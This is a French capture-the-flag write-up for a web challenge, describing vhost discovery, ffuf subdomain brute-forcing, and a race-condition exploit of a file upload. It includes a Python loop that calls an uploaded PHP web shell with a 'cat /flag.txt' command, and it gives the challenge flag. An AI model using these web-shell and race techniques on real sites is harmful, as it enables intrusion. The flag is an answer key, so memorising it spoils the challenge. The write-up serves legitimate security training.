# **TV23**.
## <u>**WEB**</u>

CATEGORIE DU CHALL

## <u>**Description**</u> :

```
DESCRIPTION DU CHALL
Une chaine d'information utilise un site web pour transmettre leurs photos, il est possible que l'application soit vulnérable.

FORMAT DU FLAG : MCTF{1cf35bf5d570cabbe4a7a222b1ad93937abf80b879132a30665479bc5c21ca92}
```

## <u>Hints</u> 

HINTS

## <u>Auteur</u> 

SpawnZii

## <u>Solution</u> :

WRITE UP

 Step1
- En regardant le code source de la page par défaut d'apache on trouve un vhost "<!-- don't forget to delete this comment russy23.ru -->".
- Ajout du vhost dans notre fichier /etc/hosts.
- On tombe sur une page avec un upload de fichier.

 Step2
- Il faut ensuite bf les vhosts pour trouver `backup.russy23.ru`
`ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://russy23.ru -H "Host: FUZZ.russy23.ru" -fs 10784`
- On obtient le code source de l'application. On comprend que le fichier upload est renommé (md5(secret+nomdufichier)), il est ensuite déplacé puis supprimé.
- Le sleep dans le code source rend vulnérable le code a une race condition.
- Nous allons donc scripter en python (ou autres) une blouche qui va faire un GET sur notre shell.
```
import requests

url = "http://russy23.ru/images/8002b0be29bfddc0466139eef609b658.php?cmd=cat /flag.txt"
for i in range(10000000):
    r = requests.get(url)
    if r.status_code == 404:
        pass
    else: 
        print(r.text)
```
- Il nous reste à upload un shell en php.


##**Flag : MCTF{1cf35bf5d570cabbe4a7a222b1ad93937abf80b879132a30665479bc5c21ca92}**
